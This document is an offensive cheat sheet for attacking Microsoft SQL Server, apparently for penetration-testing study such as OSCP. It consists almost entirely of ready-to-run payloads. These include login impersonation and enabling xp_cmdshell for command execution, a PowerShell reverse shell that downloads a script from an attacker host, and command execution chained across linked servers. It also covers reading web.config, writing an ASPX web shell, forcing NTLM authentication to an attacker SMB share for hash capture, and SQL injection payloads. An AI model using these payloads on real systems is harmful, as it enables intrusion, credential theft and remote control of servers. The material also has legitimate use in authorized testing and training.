# MSSQL Attacks

## Connecting
```bash
# With Windows auth:
impacket-mssqlclient 'DOMAIN/USER:PASS'@TARGET -windows-auth
# With SQL auth:
impacket-mssqlclient 'sa:password'@TARGET
# NetExec check:
nxc mssql TARGET -u USER -p PASS
nxc mssql TARGET -u USER -p PASS -d DOMAIN
```

## Enumeration
```sql
-- Current user and role:
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');

-- List databases:
SELECT name FROM master.sys.databases;
-- Or in impacket: enum_db

-- List users:
SELECT name FROM master.sys.server_principals;

-- Check impersonation:
SELECT * FROM sys.server_permissions WHERE type = 'IM';
-- Or in impacket: enum_impersonate

-- List linked servers:
EXEC sp_linkedservers;
SELECT * FROM sys.servers;
```

## Impersonation
```sql
-- If enum_impersonate shows a login you can impersonate:
EXECUTE AS LOGIN = 'sa';
-- Verify:
SELECT SYSTEM_USER;
-- Now you're sa → enable xp_cmdshell
```

## xp_cmdshell → RCE
```sql
-- Enable (requires sysadmin):
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-- Or in impacket: enable_xp_cmdshell

-- Execute commands:
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -e BASE64_REVSHELL';

-- Reverse shell one-liner:
EXEC xp_cmdshell 'powershell -c "iex(new-object net.webclient).downloadstring(''http://ATTACKER/shell.ps1'')"';
```

## Linked Servers
```sql
-- Enumerate linked servers:
EXEC sp_linkedservers;

-- Execute on linked server:
EXEC ('SELECT SYSTEM_USER') AT [LINKED-SERVER];
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LINKED-SERVER];
EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED-SERVER];
EXEC ('EXEC xp_cmdshell ''whoami'';') AT [LINKED-SERVER];

-- Double-hop through linked servers:
EXEC ('EXEC (''SELECT SYSTEM_USER'') AT [SECOND-LINK]') AT [FIRST-LINK];
```

## File Read/Write
```sql
-- Read file:
SELECT * FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS r;

-- Write file (OLE Automation):
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @OLE INT;
EXEC sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
DECLARE @FileID INT;
EXEC sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'C:\inetpub\wwwroot\shell.aspx', 8, 1;
EXEC sp_OAMethod @FileID, 'WriteLine', NULL, '<%@ Page Language="C#" %><%Response.Write(System.Diagnostics.Process.Start("cmd","/c "+Request["c"]).StandardOutput.ReadToEnd());%>';
EXEC sp_OADestroy @FileID;
EXEC sp_OADestroy @OLE;
```

## NTLM Hash Capture
```sql
-- Force MSSQL to auth to your SMB server:
EXEC xp_dirtree '\\ATTACKER-IP\share', 1, 1;
-- Or:
EXEC master..xp_subdirs '\\ATTACKER-IP\share';

-- On attacker, catch with responder or smbserver:
sudo responder -I eth0
-- Or:
impacket-smbserver share . -smb2support
```

## SQLi → MSSQL RCE
```
# Stacked queries through SQL injection:
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- -
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
'; EXEC xp_cmdshell 'whoami';-- -
```

## Key Notes
- Default port: **1433** (TCP), 1434 (UDP for browser service)
- `sa` is the built-in sysadmin account
- Windows auth uses the AD/machine credentials
- Impersonation is a common OSCP vector — always check `enum_impersonate`
- Linked servers can chain access across multiple SQL instances
